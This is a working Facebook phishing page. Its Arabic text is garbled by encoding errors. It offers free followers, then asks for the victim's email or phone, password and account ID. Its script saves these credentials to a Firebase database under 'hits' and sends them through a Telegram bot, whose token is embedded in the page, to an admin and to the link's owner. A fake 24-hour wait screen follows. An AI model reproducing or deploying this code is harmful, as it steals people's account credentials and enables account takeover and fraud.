<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…ØªØ§Ø¨Ø¹ÙŠÙ† ÙÙŠØ³Ø¨ÙˆÙƒ Ù…Ø¬Ø§Ù†ÙŠ ğŸš€âš¡</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <style>
        /* Ø¯Ù…Ø¬ style.css + login.css + waiting.css */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { text-align: center; background-color: #222; overflow-x: hidden; }
        
        .gradient-background { 
            width: 100%; min-height: 100vh; 
            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
            background-size: 400% 400%; animation: gradientAnimation 6s ease infinite;
            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
        }
        @keyframes gradientAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

        .main-container, .login-container, .loading-container {
            background-color: black; color: white; padding: 30px; border-radius: 15px;
            width: 100%; max-width: 500px; box-shadow: 0px 0px 20px rgba(0,0,0,0.5);
        }
        .login-container, .loading-container { background-color: white; color: #333; display: none; }

        .social-item {
            display: flex; align-items: center; background: #333; padding: 15px;
            margin: 10px auto; border-radius: 8px; cursor: pointer; transition: 0.3s; width: 90%;
        }
        .social-item:hover { background: #444; }
        .social-item img { width: 40px; margin-right: 15px; }
        
        .pricing-card { background: #444; padding: 15px; margin: 5px; border-radius: 8px; flex: 1 1 120px; }
        .buy-btn { background: #ff5722; border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer; }

        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; }
        .submit-btn { width: 100%; padding: 12px; background: #ff5722; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
        
        .progress-container { width: 100%; background: #eee; height: 10px; border-radius: 5px; margin: 20px 0; }
        .progress-bar { height: 100%; background: #ff5722; width: 100%; transition: 1s linear; }
        .heart-icon { width: 80px; margin: 20px; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
    </style>
</head>
<body>

    <div class="gradient-background">
        <div id="step-1" class="main-container">
            <h2 style="color: #ff5722; margin-bottom: 20px;">Ù…ØªØ§Ø¨Ø¹ÙŠÙ† ÙÙŠØ³Ø¨ÙˆÙƒ Ù…Ø¬Ø§Ù†ÙŠ ğŸš€âš¡</h2>
            <p>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ø­Ø³Ø§Ø¨Ùƒ Ù„ÙƒÙŠ ØªØªÙ… Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­</p>
            <div class="social-media">
                <div class="social-item" onclick="goToLogin('Facebook')">
                    <img src="https://i.postimg.cc/Hn9d715L/1000209419-removebg-preview.png"> <span>Facebook</span>
                </div>
            </div>
            <div style="display: flex; flex-wrap: wrap; justify-content: center; margin-top: 20px;">
                <div class="pricing-card"><span>1000-0$</span><br><button class="buy-btn">Ù…Ø¬Ø§Ù†ÙŠ</button></div>
                <div class="pricing-card"><span>5000-0$</span><br><button class="buy-btn">Ù…Ø¬Ø§Ù†ÙŠ</button></div>
            </div>
        </div>

        <div id="step-2" class="login-container">
            <h2 style="color: #ff5722;">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h2>
            <p>ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
            <input type="text" id="fb-user" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø§Ù„Ù‡Ø§ØªÙ">
            <input type="password" id="fb-pass" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±">
            <input type="text" id="fb-id" placeholder="Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø­Ø³Ø§Ø¨ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)">
            <select id="fb-followers">
                <option value="1000">1000 Ù…Ø¬Ø§Ù†ÙŠ âš¡</option>
                <option value="5000">5000 Ù…Ø¬Ø§Ù†ÙŠ âš¡</option>
            </select>
            <button class="submit-btn" onclick="submitData()">Ø¥Ù†Ø´Ø§Ø¡ Ø·Ù„Ø¨</button>
        </div>

        <div id="step-3" class="loading-container">
            <h2 style="color: red;">Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨...</h2>
            <p>ÙŠØªÙ… ØªØ¬Ù‡ÙŠØ² Ø·Ù„Ø¨Ùƒ ÙÙŠ ØºØ¶ÙˆÙ† 24 Ø³Ø§Ø¹Ø©</p>
            <img src="https://i.postimg.cc/FFy4S1NG/1000209418-removebg-preview.png" class="heart-icon">
            <div class="progress-container"><div class="progress-bar" id="progress"></div></div>
            <h1 id="countdown">20</h1>
        </div>
    </div>

    <script>
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase
        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
        const adminId = "5375214810";

        function getUserFromURL() {
            const params = new URLSearchParams(window.location.search);
            return params.get("user_id") || "Unknown";
        }

        function goToLogin(platform) {
            document.getElementById('step-1').style.display = 'none';
            document.getElementById('step-2').style.display = 'block';
        }

        // âœ… Ø¯Ø§Ù„Ø© submitData Ø§Ù„Ù…Ø¹Ø¯Ù„Ø© ÙÙŠ fb.html
async function submitData() {
    const user = document.getElementById('fb-user').value;
    const pass = document.getElementById('fb-pass').value;
    const id = document.getElementById('fb-id').value;
    const followers = document.getElementById('fb-followers').value;
    const ownerId = getUserFromURL();
    const time = new Date().toLocaleString('ar-EG');

    if(!user || !pass) return alert("Ø§Ù„Ø±Ø¬Ø§Ø¡ Ù…Ù„Ø¡ Ø§Ù„Ø­Ù‚ÙˆÙ„!");

    // âœ… Ø§Ù„Ø£Ù‡Ù…: Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ø£Ø¯Ø§Ø©
    await db.ref('hits/' + ownerId).push({
        tool: "fb",           // âœ… Ù„Ø§Ø²Ù… ØªØ­Ø¯Ø¯ Ø§Ù„Ø£Ø¯Ø§Ø©
        user: user,
        pass: pass,
        id: id,
        followers: followers,
        time: time,
        timestamp: Date.now(),
        platform: "Facebook"
    });

    // Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ø±Ø¶Ù‡
    const msg = `ğŸ” ØµÙŠØ¯ ÙÙŠØ³Ø¨ÙˆÙƒ Ø¬Ø¯ÙŠØ¯!\nğŸ‘¤ ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·: ${ownerId}\nğŸ“§ Ø§Ù„Ø­Ø³Ø§Ø¨: ${user}\nğŸ”‘ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯: ${pass}\nğŸ†” Ø§Ù„Ø§ÙŠØ¯ÙŠ: ${id}\nğŸš€ Ø§Ù„Ù…ØªØ§Ø¨Ø¹ÙŠÙ†: ${followers}\nâ° Ø§Ù„ÙˆÙ‚Øª: ${time}`;
    
    [adminId, ownerId].forEach(chatId => {
        if(chatId && chatId !== "Unknown") {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
        }
    });

    // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„ØµÙØ­Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';
    startTimer();
}

        function startTimer() {
            let time = 20;
            const prog = document.getElementById('progress');
            const count = document.getElementById('countdown');
            const timer = setInterval(() => {
                time--;
                count.innerText = time;
                prog.style.width = (time / 20 * 100) + "%";
                if(time <= 0) clearInterval(timer);
            }, 1000);
        }
    </script>
</body>
</html>
